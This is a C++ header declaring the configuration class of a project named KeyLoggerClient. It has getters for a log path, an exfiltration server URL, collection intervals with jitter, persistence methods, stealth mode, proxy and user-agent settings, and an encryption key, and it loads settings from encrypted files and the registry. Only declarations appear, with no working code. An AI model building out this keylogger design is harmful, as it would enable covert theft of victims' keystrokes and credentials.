// KeyLoggerClient/include/core/Configuration.h
#ifndef CONFIGURATION_H
#define CONFIGURATION_H

#include <string>
#include <unordered_map>
#include <vector>
#include <cstdint>
#include <string>

class Configuration {
public:
    Configuration();
    ~Configuration();
    
    bool LoadConfiguration();
    
    std::string GetValue(const std::string& key, const std::string& defaultValue = "") const;
    void SetValue(const std::string& key, const std::string& value);
    
    // Specific getters
    std::string GetLogPath() const;
    std::string GetServerUrl() const;
    uint32_t GetCollectionInterval() const;
    double GetJitterFactor() const;
    bool GetEnablePersistence() const;
    std::string GetPersistenceMethod() const;
    bool GetRemovePersistenceOnExit() const;
    bool GetCollectSystemInfo() const;
    uint32_t GetMaxFileSize() const;
    std::string GetCommsMethod() const;
    bool GetUseProxy() const;
    std::string GetProxyServer() const;
    uint16_t GetProxyPort() const;
    std::string GetUserAgent() const;
    uint32_t GetTimeout() const;
    std::string GetEncryptionKey() const;
    
    // Network mode methods
    std::string GetNetworkMode() const;
    std::string GetSameWifiServerUrl() const;
    std::string GetDifferentWifiServerUrl() const;  
    
    bool SaveConfiguration() const;

    bool GetStealthEnabled() const;

private:
    std::unordered_map<std::string, std::string> m_configValues;
    
    void SetDefaultValues();
    std::vector<std::wstring> GetConfigurationPaths() const;
    bool LoadFromEncryptedFile(const std::wstring& path);
    bool LoadFromRegistry();
    void ParseRegistryConfiguration(const std::string& registryData);
    std::string GenerateConfigurationKey() const;
};

#endif